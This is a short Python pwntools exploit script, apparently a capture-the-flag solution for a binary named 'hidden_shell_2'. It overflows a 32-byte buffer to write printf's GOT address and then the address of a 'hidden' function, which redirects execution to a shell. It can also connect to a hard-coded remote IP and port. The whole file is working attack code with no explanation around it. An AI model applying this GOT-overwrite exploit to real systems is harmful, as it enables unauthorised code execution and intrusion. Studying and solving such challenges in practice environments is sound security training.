from pwn import *

elf = context.binary = ELF('./hidden_shell_2', checksec=False)
context.log_level = 'debug'

gdbscript = '''
break *0x401258
break *0x40128c
continue
'''
# 0x401258 after first gets
# 0x40128c after second gets
HOST, PORT= '213.35.127.78', 13403

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)

p = start()

padding = b'a' * 32

payload = flat(
    padding,
    elf.got.printf
    )

p.sendlineafter(b'name:', payload)

payload = flat(
    elf.sym.hidden
    )

p.sendlineafter(b'name:', payload)
p.interactive()